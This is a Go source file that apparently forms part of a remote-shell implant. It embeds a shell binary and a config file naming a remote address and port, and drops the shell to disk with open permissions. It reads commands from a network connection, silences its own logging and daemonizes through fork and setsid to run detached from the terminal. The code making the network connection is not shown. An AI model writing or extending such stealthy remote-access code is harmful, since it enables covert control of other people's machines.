package main

import (
	"bufio"
	"embed"
	"encoding/json"
	"errors"
	"log"
	"net"
	"os"
	"path"
	"syscall"
	"time"
)

// In order to use a different config file, replace `config.json`
// with the new file name.

//go:embed ash
//go:embed config.json
var fs embed.FS

var DefaultConfigFile = "config.json"
var DefaultShell = "ash"

type Config struct {
	Addr     string `json:"address"`
	Port     int    `json:"port"`
	Protocol string `json:"protocol"`
	Timeout  int64  `json:"timeout"`
	Path     string `json:"shellpath"`
	Debug    bool   `json:"debug"`
}

var (
	ErrorTimeOut     = errors.New("Connection timed out")
	ErrorConnUnavail = errors.New("Connection has terminated or is inaccessible")
)

type NetLineReader struct {
	Conn    net.Conn
	Scanner *bufio.Scanner
	Timeout int64
}

func readConfig() Config {
	data, err := fs.ReadFile(DefaultConfigFile)
	check(err)

	var config Config
	err = json.Unmarshal(data, &config)
	check(err)

	return config
}

func newNetLineReader(conn net.Conn, timeout int64) NetLineReader {
	return NetLineReader{
		conn,
		bufio.NewScanner(conn),
		timeout,
	}
}

func (n *NetLineReader) Readline() ([]byte, error) {
	dur := time.Now().Add(time.Second * time.Duration(n.Timeout))
	n.Conn.SetReadDeadline(dur)

	if !n.Scanner.Scan() {
		if errors.Is(n.Scanner.Err(), os.ErrDeadlineExceeded) {
			return nil, ErrorTimeOut
		}
		return nil, ErrorConnUnavail
	}

	line := append(n.Scanner.Bytes(), byte('\n'))
	return line, nil
}

func loadShell(dir string) string {
	data, err := fs.ReadFile(DefaultShell)
	check(err)

	check(os.MkdirAll(dir, 0777))

	shellpath := path.Join(dir, DefaultShell)
	f, err := os.OpenFile(shellpath, os.O_WRONLY|os.O_CREATE, 0777)
	check(err)
	defer f.Close()

	_, err = f.Write(data)
	check(err)

	return shellpath
}

func check(e error) {
	if e != nil {
		log.Fatal(e)
	}
}

func disableLogging() {
	f, err := os.Open("/dev/null")
	check(err)

	log.SetOutput(f)
}

func daemonize() {
	pid := fork()

	/* the parent must exit */
	if pid != 0 {
		os.Exit(0)
	}

	syscall.Setsid()
}

func fork() uintptr {
	pid, _, err := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
	if err != 0 {
		check(err)
	}

	return pid
}
